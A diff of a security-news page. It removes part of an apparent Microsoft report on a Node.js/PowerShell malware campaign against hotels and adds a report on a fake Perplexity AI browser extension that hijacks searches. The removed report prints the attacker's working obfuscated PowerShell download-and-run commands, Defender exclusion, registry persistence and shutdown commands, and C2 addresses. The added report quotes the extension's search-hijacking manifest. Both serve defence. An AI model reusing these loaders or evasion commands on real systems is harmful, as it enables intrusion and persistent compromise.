-Figure 3. Node.js implant execution with random JavaScript filenames and C2 domain arguments.
-The Node.js runtime functions as the interpreter for the implant’s .js payloads. Microsoft assesses that placing the runtime in a user-writable location could help the threat actor avoid dependencies on a system-installed Node.js binary while also supporting repeated payload reuse across different filenames. Hash reuse across distinct filenames confirms reuse of the same binaries, reinforcing the assessment that the threat actor prioritizes operational repeatability.
-The Node.js implant also establishes its own persistence by spawning PowerShell to create a detached, hidden child process:
-powershell.exe -c "$code = \"require('child_process').spawn(process.execPath, ['C:\\Users\\[REDACTED]\\AppData\\Local\\Nodejs\\<random>.js'], {detached: true, stdio: 'ignore', windowsHide: true}).unref()\"; $command = ... </random> |
-Figure 4. Node.js persistence mechanism using child_process.spawn with detached and windowsHide flags.
-Defense evasion and payload execution
-Once the Node.js component is established, the campaign modifies Defender settings by using Add-MpPreference -ExclusionProcess for temporary-path executables. We assess that this exclusion step is intended to reduce inspection of follow-on binaries located in AppData\Local\Temp. Figure 5 shows representative observed exclusion commands:
-powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\utramdJQjRMJ.exe\"" powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\YEg9nfBg3QG4.exe\"" powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\57AVjhcz6vL0c.exe\"" powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\sDNud94J7WVDN.exe\"" |
-Figure 5. Defender process exclusions added for randomly named EXE files seconds before their execution.
-These excluded random EXE files in AppData\Local\Temp are then launched, followed by helper .tmp installers or unpackers that used names matching is-*.tmp and commonly ran with /SL5 or /VERYSILENT. This combination suggests a deployment chain in which the Node.js implant stages additional binaries, then launches installer-like helpers to unpack or execute the next payload. Microsoft assesses that the .tmp convention and silent-install flags are likely chosen to minimize user awareness while also obscuring the actual payload family.
-ProgramData relocation and persistence
-Observed payloads are then copied into C:\ProgramData\<random>\<payload>.exe. Lowercase copies with the same hash appear under different filenames, which is consistent with repackaging or relocation for stability rather than recompilation. Figure 6 shows representative observed ProgramData paths from the campaign:
-C:\ProgramData\FFXjwKn\fehqf5oo.exe C:\ProgramData\PEIEZlD\qulcp452eb9.exe C:\ProgramData\YXbwfua\e6kz1ruadskkk.exe C:\ProgramData\PsrOqKF\vl8daccehg.exe C:\ProgramData\riloNEK\s8bpfaee.exe C:\ProgramData\JMSVrLU\choffgpa.exe |
-Figure 6. ProgramData relocation paths with randomized folder names and lowercase payload filenames.
-The persistence model used in this campaign is especially notable. We observed a dual mechanism in which HKCU\RunOnce pointed to the ProgramData executable while HKCU\Run pointed to the Node.js component. Figure 7 shows a representative registry persistence command:
-cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "zZBPZPuA" /t REG_SZ /d "C:\ProgramData\FFXjwKn\fehqf5oo.exe" /f |
-Figure 7. Registry RunOnce persistence pointing to ProgramData payload with randomized value name.
-The RunOnce behavior is particularly unusual because the payload refreshes its own persistence after each execution, effectively creating a RunOnce loop. Microsoft assesses that this design might have been intended to complicate cleanup by repopulating an entry that defenders might otherwise treat as one-time execution.
-Command and control
-In later stages of the campaign, compromised systems beacons to fixed IP infrastructure over non-standard ports including:
-- 8443
-- 8445
-- 8453
-- 5555
-- 56001
-- 56002
-- 56003
-We observed the campaign expanding its C2 infrastructure between waves:
-Wave 1 IPs:
-- 178.16.54[.]27
-- 95.217.97[.]121
-- 193.202.84[.]32
-- 178.16.55[.]179
-The IP address 178.16.54[.]27 remains active on ports 56001/56002 across both waves.
-We also observed numerous unique domains themed around photos, documents, visas, safes, and vaults, spanning top-level domains (TLDs) such as the following:
-- .info
-- .com
-- .pro
-- .xyz
-- .cloud
-- .icu
-- .sbs
-- .click
-- .bond
-- .cfd (Wave 2)
-Wave 2 introduced Cloudflare-hosted .cfd domains following a photo-<random numbers> naming convention:
-- photo-26254[.]cfd
-- photo-26654[.]cfd
-- photo-132454[.]cfd
-- photo-8632454[.]cfd
-The domain sec-safe-dc[.]info was observed active in both waves, further supporting the assessment of a single continuous campaign.
-Obfuscation evolution
-A defining characteristic of this campaign is its steady but disciplined obfuscation evolution. Microsoft observed seven PowerShell obfuscation phases over the course of the campaign, but the underlying logic remained consistent: decode embedded data through arithmetic operations, recover the next-stage content, and retrieve a PowerShell script that runs from the %TEMP% folder. This pattern suggests that the threat actor is iterating for durability against static detections rather than experimenting with entirely new tradecraft.
-Phase 1: XOR bigint decoding
-Early samples rely on XOR arithmetic, using two large integers and a -bxor operation, followed by byte masking and shifting. The following is a representative observed command line:
-powershell.exe -ep bypass -c "$k=[bigint]\"2004985473718821432817707887657617\"; $w=[bigint]\"278573358569528286847653191217377\";$o=$k -bxor $w; while($o -ne 0){$g+=[char]([int]($o -band 0xFF));$o=$o -shr 8}; iwr $g -OutFile $env:TEMP\eRJGv.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\eRJGv.ps1" |
-Figure 9. Phase 1 PowerShell downloader using XOR-based bigint decoding with -bxor, -band 0xFF, and -shr 8.
-Phase 2: Subtraction replaces XOR
-Microsoft then observed the threat actor swapping XOR logic for subtraction while keeping the rest of the decoder identical. This change bypasses detections anchored on -bxor:
-powershell.exe -ep bypass -c "$i=[bigint]\"1568015162836542885394310232785365293\"; $y=[bigint]\"989592658109712364469795296253690811\";$r=$i - $y; while($r -ne 0){$m+=[char]([int]($r -band 0xFF));$r=$r -shr 8}; iwr $m -OutFile $env:TEMP\VJksAkfp.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\VJksAkfp.ps1" |
-Figure 10. Phase 2 variant replacing -bxor with subtraction while preserving the same decoding structure.
-Phase 3: Hexadecimal to decimal substitution
-The decoder then shifts from -band 0xFF to -band 255. Although functionally equivalent (0xFF = 255), this change is consistent with a threat actor testing whether surface-level constant changes could degrade signature reliability:
-powershell.exe -ep bypass -c "$e=[bigint]\"1080978693158786688289132234139422058835788841232\"; $l=[bigint]\"444996423444240363171355535687083720697400778653\";$w=$e - $l; while($w -ne 0){$j+=[char]([int]($w -band 255));$w=$w -shr 8}; iwr $j -OutFile $env:TEMP\ymqMj.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\ymqMj.ps1" |
-Figure 11. Phase 3 variant replacing 0xFF with decimal 255.
-Phase 4: Arithmetic masking
-Masking expressions are further transformed into arithmetic forms that evaluate to the same constant. This variation prevents simple string matching on either 0xFF or 255:
-powershell.exe -ep bypass -c "$e=[bigint]\"988466760738254167909712279829942477\"; $y=[bigint]\"352542850680807474382013127968401501\";$i=$e - $y; while($i -ne 0){$b+=[char]([int]($i -band (177+78)));$i=$i -shr 8}; iwr $b -OutFile $env:TEMP\23QbL.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\23QbL.ps1" |
-Figure 12. Phase 4 variant hiding the byte mask behind arithmetic expressions such as (177+78).
-Other observed arithmetic masks included -band (100+155) and -band 128+127, all resolving to 255.
-Phase 5: Modulo and division
-Later samples replace the bit-shift model entirely, switching from -band and -shr to modulo and division operations:
-powershell.exe -ep bypass -c "$s=[bigint]\"28248557062916408148263140002288993200489702\"; $o=[bigint]\"18544237761852163685406436002210545666450291\";$e=$s - $o; while($e -ne 0){$x+=[char]([int]($e -band (255)));$e=$e -shr 8}; iwr $x -OutFile $env:TEMP\PVtvOP40.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\PVtvOP40.ps1" |
-Figure 13. Phase 5 transitional variant; later samples in this phase fully replaced -band/-shr with % 256 and / 256.
-Phase 6: Syntax diversification and randomization
-The threat actor adopts “num” -as [bigint] casting syntax, introduces long random variable names, and uses modulo/division for byte extraction. The combined effect makes each sample visually distinct despite identical logic:
-powershell.exe -ep bypass -c "$zGjEc0LINYdefj=\"25908558764390958596189327204542\" -as [bigint]; $MyL4evU3=256; $GqA4xFav=\"17082531775760189576112827972435\" -as [bigint]; $XwcU0kg87CFgqe5=$zGjEc0LINYdefj - $GqA4xFav; while($XwcU0kg87CFgqe5 -ne 0){ $qy8gWy4FONBaCV+=[char]([int]($XwcU0kg87CFgqe5 % $MyL4evU3)); $XwcU0kg87CFgqe5=$XwcU0kg87CFgqe5 / $MyL4evU3}; iwr $qy8gWy4FONBaCV -OutFile $env:TEMP\<random>.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\<random>.ps1" </random></random> |
-Figure 14. Phase 6 variant using -as [bigint] syntax, long randomized variable names, and modulo/division decoding.
-Phase 7: For-loop variant with arithmetic mask (Wave 2)
-The most recent observed phase introduces a for-loop iteration model with an arithmetic mask using a variable set to 100+156 (=256) and -as [bigint] casting. This is a natural evolution of Phase 6’s syntax diversification, further altering the control flow structure while preserving the same underlying decode-and-download behavior:
-powershell.exe -ep bypass -c "$IcZWdT=100+156; $<var>=\"<bigint_value>\" -as [bigint]; $<var2>=\"<bigint_value2>\" -as [bigint]; $<result>=$<var> - $<var2>; for($i=0; $<result> -ne 0; $i++){ $<output>+=[char]([int]($<result> % $IcZWdT)); $<result>=[bigint]($<result> / $IcZWdT)}; iwr $<output> -OutFile $env:TEMP\<random>.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\<random>.ps1" </random></random></output></result></result></result></output></result></var2></var></result></bigint_value2></var2></bigint_value></var> |
-Figure 15. Phase 7 variant (Wave 2) introducing a for-loop with arithmetic mask $IcZWdT=100+156 and -as [bigint] casting.
-This seven-phase evolution demonstrates a threat actor that monitors or anticipates detection pressure. The campaign doesn’t pivot away from PowerShell or Node.js; instead, it repeatedly re-skins a working loader. For defenders, this means purely literal detections on isolated operators, constants, or variable names might age quickly, while behavior-based detections anchored on the full sequence—shortcut execution, PowerShell decode, %TEMP% staging, Node.js from user space, Defender exclusions, and ProgramData persistence—are likely to remain more resilient.
-Campaign evolution
-Microsoft assesses that the observable differences between Wave 1 and Wave 2 represent a deliberate operational evolution by the same threat actor. The following cross-wave correlations support this assessment:
-Evidence of a single continuous campaign
-| Indicator | Wave 1 (April to May 2026) | Wave 2 (Late May to June 2026) | Assessment |
-| PE payload hash (xmnrwv9l.exe) | 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1 | Same hash observed | Same payload binary |
-| C2 IP | 178.16.54[.]27 | Same IP, ports 56001/56002 | Same infrastructure |
-| Node.js version | v24.13.0-win-x64 | v24.13.0-win-x64 | Same runtime |
-| Domain | sec-safe-dc[.]info | Active in both waves | Shared domain |
-| C2 ports | 56001, 56002, 56003 | 56001, 56002 | Same non-standard port pattern |
-Cross-wave artifact overlaps demonstrating a single continuous campaign.
-What changed between waves
-| Dimension | Wave 1 (April to May 2026) | Wave 2 (Late May to June 2026) |
-| LNK naming | IMG-<random numbers>.png.lnk | PHOTO-<random numbers>.png.lnk |
-| ZIP contents | LNK only | LNK (PHOTO- prefix) |
-| Attack chain | PowerShell → Node.js | PowerShell → csc.exe/cvtres.exe → DLL → Node.js |
-| Obfuscation | Phases 1–6 | Phase 7 (for-loop variant) |
-| Domain TLDs | .info, .com, .pro, .xyz, .cloud, .icu, .sbs | Added .cfd, .click, and .bond |
-| Infrastructure | Direct hosting | Cloudflare-fronted .cfd domains |
-| C2 domains | Photo, document, and visa themes | Added zloapobikahy23[.]bond, higoksbupwou[.]com, aluminiostramuntana[.]com |
-Summary of campaign evolution from Wave 1 to Wave 2.
-Microsoft assesses that these changes reflect operational maturation rather than a shift in objectives. The threat actor expanded evasion (DLL compilation, Cloudflare fronting) and broadened targeting—all while maintaining the same core attack chain and reusing key infrastructure.
-Persistence survival analysis
-One of the significant findings from Wave 2 is the demonstrated resilience of the dual persistence model under active Defender intervention.
-On a confirmed compromised device, Defender detected and blocked one PE payload (xmnrwv9l.exe, SHA-256: 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1) with Wacatac detections. Despite that block, the Node.js HKCU\Run key persistence remained active. Approximately two days later, the Node.js implant reactivated and resumed C2 communications to new domains.
-Following the initial block, Microsoft observed additional /VERYSILENT EXEs deployed on the same device:
-cBA8H4S5k04jAY.exe eaa3q8BQZcnIOV.exe BaUWXagH4CGZS.exe CJE4domtVFM9LX.exe |
-Figure 18. Additional payload EXEs deployed after Defender blocked the initial PE, demonstrating the implant’s ability to retry delivery through the surviving Node.js persistence.
-This sequence highlights a remediation consideration: the dual persistence model (RunOnce for the PE payload + Run for Node.js) means that blocking one execution path might not fully neutralize the other. The Node.js implant, if it remains active, can re-download and re-attempt payload delivery. Microsoft assesses that complete remediation of this campaign requires removal of both persistence mechanisms—the ProgramData RunOnce entry and the Node.js Run key—along with the Node.js runtime and associated .js files from the user’s AppData\Local\Nodejs\ directory.
-Post-compromise activity
-Microsoft observed a subset of devices reaching clear late-stage post-compromise behavior. On multiple devices, the activity progressed to active C2 beaconing, browser automation with –headless –no-sandbox flags, and environment lookups. Based on the command-line pattern alone, Microsoft assesses that the threat actor likely used automated browser execution rather than manual interactive browsing on those hosts.
-The campaign also performed an environment lookup using ip-api[.]com, observed through 208.95.112[.]1. This behavior is consistent with gathering external network context before continuing operations. Microsoft assesses that this lookup might have helped the operator understand geographic or connectivity attributes of the compromised device environment.
-A final disruptive behavior involved forced shutdown through cmd /c shutdown -s -t 0, observed on multiple devices. Microsoft assesses that immediate shutdown could have served several purposes depending on the host context: interruption of user activity, reduction of defender response time during a specific stage, or concealment of visible symptoms after automated browser tasks or payload launches completed.
-The persistence design itself is a meaningful post-compromise observation. The combination of a durable Node.js launch point in HKCU\Run and a repeatedly refreshed ProgramData payload through HKCU\RunOnce suggests an effort to maintain execution options across user sign-ins while also preserving a secondary recovery path. This RunOnce loop is unusual enough that it might provide defenders with a strong hunting pivot even when file names, domains, or script syntax change.
+            <h2 class="article-title">Chromium extension uses AI‑related branding to redirect browser search</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/29/chromium-extension-uses-airelated-branding-redirect-browser-search/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft Threat Intelligence has identified a malicious Chromium-based extension that spoofs the AI-powered answer engine Perplexity AI to trick unsuspecting users into installing it. Based on our observation of the extension’s behavior, we assess its primary objective to be search traffic interception and data collection, which might enable downstream use cases such as profiling, targeted advertising, or other forms of misuse depending on operator intent. Through responsible disclosure, we reported this extension to Google, and it has been taken down as of this writing. We’d like to thank Google for responding to and addressing this issue.
+Browser extensions continue to represent a significant attack surface within enterprise and consumer ecosystems due to their privileged access to browser APIs, user traffic, and browsing behavior. However, unlike traditional search hijackers that rely primarily on aggressive monetization or visible redirection, this extension combines Manifest Version 3 (MV3) capabilities with intermediary infrastructure and declarativeNetRequest (DNR) rules to transparently intercept Omnibox queries while preserving the appearance of legitimate search results. In addition, while browser search hijacking is not a new threat category, this research highlights how [threat actors continue to operationalize AI](https://www.microsoft.com/en-us/security/blog/2026/03/06/ai-as-tradecraft-how-threat-actors-operationalize-ai/) to accelerate attacks—specifically the [use of AI brands as a social engineering vector](https://www.microsoft.com/en-us/security/blog/2026/06/08/ai-brands-as-bait-how-threat-actors-are-using-the-ai-hype-in-social-engineering/).
+The extension routes both full search queries and real-time search suggestions (typed characters) through attacker-controlled infrastructure hosted on a domain not associated with the legitimate vendor, before redirecting users to expected search providers. While the observed activity demonstrates the capability to capture user input and browsing signals, no evidence in our analysis definitively confirms additional objectives such as credential theft. However, the level of access and permissions requested introduces elevated privacy and security risk.
+As threat actors continue to capitalize on emerging industry trends such as AI and leverage trusted branding to improve the success rates of their campaigns, organizations should strengthen user awareness training and similar programs to educate end users about the latest social engineering tactics. They should also implement a layered security strategy that correlates available indicators with behavioral signals and other threat intelligence.
+In this blog post, we provide our analysis of the browser extension—including key indicators of malicious behavior and findings from our dynamic analysis. We also provide mitigation and protection guidance, as well as advanced hunting queries, to help organizations detect and defend against this threat.
+Extension overview
+The extension we analyzed has the following attributes:
+| Attribute | Value |
+| Extension name | Search for perplexity ai |
+| Extension ID | flkebkiofojicogddingbdmcmkpbplcd |
+| Manifest version | MV3 |
+| Version | 2.2 |
+| Observed purpose | Browser search override and redirect logic |
+| Referenced brand | Perplexity AI |
+| Suspicious domain | perplexity-ai[.]online |
+It appears to spoof the publicly available Perplexity service by using similar branding elements and a typosquatted domain. The said domain mismatch might increase the likelihood of user confusion regarding the extension’s source or affiliation.
+Based on our analysis, the extension has been classified as malicious due to observed search redirection behavior. The analyzed extension’s manifest declares itself as the following:
+"search_provider": { "name": "Perplexity Search" } |
+It uses the following infrastructure:
+"search_url": https://perplexity-ai[.]online/search/{searchTerms} |
+The extension also forces itself as the browser default search provider:
+"is_default": true |
+At first glance, the extension appears to provide AI-enhanced search functionality. However, analysis of the manifest reveals multiple suspicious behaviors and permissions inconsistent with legitimate AI search assistants.
+Key indicators of malicious behavior
+Typosquatted infrastructure
+The extension uses the domain perplexity-ai[.]online, which is similar to the legitimate Perplexity AI service’s domain (perplexity[.]ai). This pattern is consistent with domain naming approaches often frequently observed in phishing campaigns, search hijackers, fake AI applications, and extension malware.
+[Previous research](https://www.zscaler.com/blogs/security-research/phishing-typosquatting-and-brand-impersonation-trends-and-tactics) has discussed how browser extensions might use branding similar to trusted services because:
+- Users associate AI tools with productivity and legitimacy
+- AI-related extensions currently experience high install rates
+- Users are less suspicious of browser-integrated AI assistants
+Browser search hijacking
+The extension overrides browser search settings through chrome_settings_overrides to replace the browser default search provider as well as intercept and redirect all queries in a Chromium browser’s Omnibox to an intermediary infrastructure not associated with the official vendor domain:
+"chrome_settings_overrides": { "search_provider": { "name": "Perplexity Search", "keyword": "perplexity", "is_default": true, "search_url": "hxxps://perplexity-ai[.]online/search/{searchTerms}", "favicon_url": "hxxps://perplexity-ai[.]online/favicon.ico", "suggest_url": "hxxps://perplexity-ai[.]online/search?output=firefox&q={searchTerms}" } } |
+Critically, the suggest_url field also routes through perplexity-ai[.]online. This means real-time search suggestions—every character typed in the address bar—are transmitted to an attacker-controlled infrastructure before any redirect occurs. This constitutes active user surveillance (keystroke-level capture) beyond simple search redirection.
+Although Chromium-based browsers permit search provider overrides for legitimate use cases, [Google ][explicitly states](https://developer.chrome.com/docs/extensions/reference/manifest/chrome-settings-override) that extensions requesting settings overrides along with additional powerful capabilities might violate the browser’s single-purpose policy.
+Abuse of declarativeNetRequest
+The extension requests powerful DNR permissions that enable traffic redirection, URL rewriting, and selective request filtering, which aren’t consistent with expected AI assistant behavior:
+"permissions": [ "declarativeNetRequest", "declarativeNetRequestFeedback", "declarativeNetRequestWithHostAccess" ] |
+These permissions provide specific capabilities exploited by this extension:
+- declarativeNetRequest: Redirects all main_frame requests matching perplexity-ai[.]online/search/(.*) to legitimate search engines, creating a two-hop chain where the attacker server processes the query before the browser is redirected.
+- declarativeNetRequestFeedback: Allows the extension to programmatically monitor which redirect rules fire, effectively confirming exfiltration success for each intercepted query.
+- declarativeNetRequestWithHostAccess: Combined with host_permissions for ://perplexity-ai.online/, enables full request interception capabilities on the attacker-controlled domain. This behavior might enable traffic redirection and related activity depending on implementation.
+The use of these permissions in an AI-themed search extension is particularly concerning because a legitimate search UI generally doesn’t require advanced network-manipulation APIs.
+Search rewrite infrastructure
+Multiple rule sets indicate modular traffic hijacking capability across providers such as Perplexity, Google, and Bing:
+"rule_resources": [ { "id": "perplexity", "enabled": true, "path": "perplexity-rules.json" }, { "id": "bing", "enabled": false, "path": "bing-rules.json" }, { "id": "google", "enabled": false, "path": "google-rules.json" } ] |
+This architecture enables modular traffic redirection controlled by the background service worker. The two-hop redirect design is critical to understanding the threat model:
+- Browser sends query to perplexity-ai[.]online (attacker server logs query, HTTP headers, IP, user-agent)
+- DNR rule immediately redirects browser to legitimate engine (perplexity[.]ai, google[.]com, or bing[.]com)
+- User sees normal search results, completely unaware of interception
+The data theft occurs on hop 1, not on the redirect (hop 2). The server-side code (server.js) shipped with the extension explicitly logs all incoming requests including full headers, confirming the data collection intent. This activity aligns with behaviors observed in modern browser hijackers and ad-fraud ecosystems.
+Host permissions
+The extension requests host access to intermediary infrastructure not associated with the official vendor domain, enabling data interception and telemetry exposure:
+"host_permissions": [ "*://perplexity-ai[.]online/*" ] |
+Content security policy
+The extension declares the following:
+"content_security_policy": {"extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'self';"} |
+The inclusion of wasm-unsafe-eval is unusual for a search-redirect extension because it permits WebAssembly (Wasm) execution within extension pages. Although no Wasm modules were observed in version 2.2, the presence of this directive enables future Wasm-based functionality without requiring modifications to the extension’s content security policy configuration.
+Dynamic analysis findings
+Upon installation, the extension opens hxxps://extension.tilda[.]ws/perplexityai, presenting target users with an onboarding page designed to resemble a legitimate product setup flow. Similar onboarding techniques have been observed in extension-based adware and search-redirection campaigns, where they’re used to increase user trust and reduce scrutiny of subsequent browser modifications.
+The runtime workflow we’ve observed demonstrates browser search redirection behavior:
+- User enters search query into the Omnibox.
+- Browser request routed to perplexity-ai[.]online.
+- Server logs full request: query string, HTTP headers, user-agent, and source IP address.
+- suggest_url captures real-time keystrokes during typing (before Enter is pressed)
+- Ruleset executes redirect.
+- User is delivered to selected search provider.
+Unusually, this extension ships with its own server-side infrastructure code, revealing the complete attack architecture:
+- server.js (Node.js proxy)
+- Logs all incoming requests including method, URL, and full HTTP headers.
+- Proxies’ suggestion queries to suggestqueries.google[.]com.
+- Adds permissive CORS headers (Access-Control-Allow-Origin: *) to enable cross-origin responses.
+- nginx.conf
+- Configures perplexity-ai[.]online with Let’s Encrypt SSL.
+- Proxies /search endpoint to Google suggestions API.
+- Filters CORS origins exclusively to *.oda[.]digital (operator infrastructure).
+- Forces HTTP-to-HTTPS redirect.
+This server-side code is definitive evidence that query interception and logging is architecturally intentional, not an incidental by-product of the redirect mechanism.
 Mitigation and protection guidance
-Organizations in hospitality and adjacent service industries should prioritize layered detections for this campaign’s behavior sequence rather than any single indicator. Microsoft recommends the following actions based on the observed attack chain:
-- Treat photo-themed ZIP archives and fake image shortcuts as high risk. Investigate browser-downloaded archives matching photo-<random numbers>.zip and shortcut files matching IMG-<random numbers>.png.lnk or PHOTO-<random numbers>.png.lnk, especially when they’re followed by PowerShell or script interpreter launches.
-[Learn more about attack surface reduction rules](https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference)
-- Harden and monitor PowerShell execution. Because the campaign repeatedly used obfuscated BigInt arithmetic across seven phases, defenders should prioritize PowerShell activity that includes unusual combinations of BigInt casting, subtraction or XOR decode logic, byte masking, modulo or division byte extraction, for-loop decode patterns, and subsequent Invoke-WebRequest behavior.
-[Learn more about PowerShell constrained language](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_language_modes)
-- Monitor for unexpected .NET compilation. The appearance of csc.exe spawning cvtres.exe and producing small DLLs in user-writable paths, especially when initiated by PowerShell scripts from %TEMP%, is unusual in hospitality environments and should be investigated.
-- Investigate Node.js execution from user-space paths. node.exe running from C:\Users\<user>\AppData\Local\Nodejs\ with a random .js file and domain argument is unusual in many enterprise environments. Microsoft recommends reviewing whether Node.js is expected on reception, front office, or similarly targeted systems.
-- Alert on Defender exclusion changes tied to temporary executables. Add-MpPreference -ExclusionProcess aligned to %TEMP% or AppData\Local\Temp should be treated as suspicious when associated with shortcut-driven or script-driven execution chains.
-[Learn more about tamper protection](https://learn.microsoft.com/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection).
-- Hunt for random EXE launches from temporary paths and helper .tmp installers. The campaign uses numerous unique temporary executable filenames and helper is-*.tmp files with /SL5 or /VERYSILENT. These patterns are likely more durable than individual filenames.
-- Review persistence in both HKCU\Run and HKCU\RunOnce. Pay particular attention to values that launch node.exe from user directories or reference executables under C:\ProgramData\<random>\. Because the campaign refreshes RunOnce, repeated recreation of that value might be a strong signal. Critically, both keys must be removed during remediation—removing only the RunOnce entry leaves the Node.js implant active.
-- Monitor network connections on the observed non-standard ports. Outbound traffic to 8443, 8445, 8453, 5555, 56001, 56002, and 56003, especially when initiated by node.exe or executables from user profile and temporary paths, should be reviewed promptly.
-- Block or alert on .cfd domains matching the campaign pattern. Wave 2 domains follow a photo-<digits>[.]cfd naming convention. Organizations should consider blocking these patterns and monitoring for DNS queries to recently registered .cfd domains.
-- Investigate browser automation and forced shutdown patterns. The combination of –headless –no-sandbox and cmd /c shutdown -s -t 0 might indicate late-stage execution on selected hosts.
-- Use sector-aware hunting. Because Microsoft observed concentration in hospitality and hotel environments across multiple countries, organizations should review devices associated with front desk, reservation, reception, and guest-facing workflows first.
-Microsoft Defender XDR detections
-Microsoft assesses that Microsoft Defender coverage for this campaign is most effective when it combines process, registry, file, and network telemetry rather than relying on blocking individual indicators of compromise (IOCs).
-TonRAT is the campaign’s implant family (validated on the dropped .ps1 and .js payloads). “Wacatac” and “PureRat” are Microsoft Defender detection names that fire on specific binaries in the attack chain (the LNK or PE payload and the ProgramData persistence executable, respectively).
-Beyond signature-based prevention, Microsoft Defender can surface this campaign through behavioral detections, including alerts such as Suspicious Node.js child process execution and Node.js Hidden Run‑Key Persistence, which are designed to identify implant activity even as file names, domains, and script syntax change.
-Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+Microsoft recommends the following mitigations to reduce the impact of this threat.
+- Restrict the installation of untrusted browser extensions by enforcing allow‑listing and enterprise policy controls within managed environments.
+- Encourage users to verify extension publishers, domains, and branding—particularly for AI-themed tools commonly leveraged in social engineering scenarios.
+- Monitor unauthorized changes to browser search settings, unusual extension permissions, and outbound traffic to intermediary or non-standard domains associated with search activity. Controls that identify or flag extensions requesting search override capabilities or network-related APIs can help reduce potential risk exposure. Continuous inspection of extension behavior, alongside reputation-based methods, might also provide improved visibility into anomalous or potentially unwanted activity.
+- Leverage platform-level protections to further reduce risk:
+- Microsoft Edge includes built-in capabilities designed to identify and respond to potentially malicious or unwanted extensions that attempt to manipulate browser behavior, including search redirection. Depending on configuration and risk signals, Edge might restrict or block extension execution.
+The Microsoft Edge Add-ons store also uses automated and manual review processes to assess extensions before and after publication, while ongoing monitoring enables identification and removal of extensions that violate policies—helping reduce user exposure to emerging threats.
+[Microsoft Defender SmartScreen](https://learn.microsoft.com/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/)provides reputation-based protection for URLs and web content, helping detect and block access to domains associated with malicious or deceptive activity.
+- Microsoft Edge includes built-in capabilities designed to identify and respond to potentially malicious or unwanted extensions that attempt to manipulate browser behavior, including search redirection. Depending on configuration and risk signals, Edge might restrict or block extension execution.
+Microsoft Defender detections
+Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
 Customers with provisioned access can also use [Microsoft Security Copilot in Microsoft Defender](https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender) to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
 | Tactic | Observed activity | Microsoft Defender coverage |
-| Initial access | Photo-themed ZIP with fake image LNK | Microsoft Defender for Endpoint Trojan:Win32/Wacatac prevented |
-| Execution | Obfuscated PowerShell BigInt decoder downloads a .ps1 dropper | Microsoft Defender for Endpoint Suspicious PowerShell command line Microsoft Defender Antivirus TrojanDropper:PowerShell/TonRAT |
-| Node.js runs the decrypted malicious JavaScript implant | Microsoft Defender for Endpoint Suspicious Node.js child process execution Microsoft Defender Antivirus Trojan:JS/TonRAT | |
-| Persistence | Dual Run/RunOnce registry keys (Node.js + ProgramData EXE) | Microsoft Defender for Endpoint Anomaly detected in ASEP registry Node.js Hidden Run‑Key Persistence Microsoft Defender Antivirus Trojan:Win32/PureRat |
+| Discovery | Presence of suspicious or unverified browser extension identifiers | – Detection of unknown or low-reputation extension artifacts – Monitoring extension-related files through endpoint telemetry |
+| Command and Control (C2) | Outbound communication to suspicious or lookalike domains associated with redirection infrastructure | – Detection of connections to suspicious or low-reputation domains – Network telemetry correlation identifying intermediary infrastructure |
 Microsoft Security Copilot
-Microsoft Security Copilot customers can use the following [prebuilt promptbooks](https://learn.microsoft.com/copilot/security/using-promptbooks) to support investigation and response for activity related to this campaign:
-- Incident investigation: Summarize incidents and triage alerts related to Node.js persistence, PowerShell decode chains, and registry modification.
-- Microsoft User analysis: Profile compromised hospitality accounts (reception, frontdesk, reservations) for scope assessment.
+Security Copilot customers can use the standalone experience to [create their own prompts](https://learn.microsoft.com/copilot/security/prompting-security-copilot) or run the following [prebuilt promptbooks](https://learn.microsoft.com/copilot/security/using-promptbooks) to automate incident response or investigation tasks related to this threat:
+- Incident investigation: Assist analysts in investigating alerts, correlating signals, and supporting analysis of extension-related activity to intermediary domains such as perplexity-ai[.]online.
+- Microsoft User analysis: Support analysis of potentially impacted users whose browser search activity has been intercepted or redirected by malicious extensions.
 Advanced hunting queries
-Microsoft Defender XDR
 NOTE: The following sample queries lets you search for a week’s worth of events. To explore up to 30 days’ worth of raw data to inspect events in your network and locate potential related indicators for more than a week, go to the Advanced Hunting page > Query tab, select the calendar dropdown menu to update your query to hunt for the Last 30 days.
-Fake image shortcut execution (both LNK naming patterns)
-This query identifies execution of shortcut files matching the campaign’s photo-themed LNK naming convention across both Wave 1 and Wave 2 patterns.
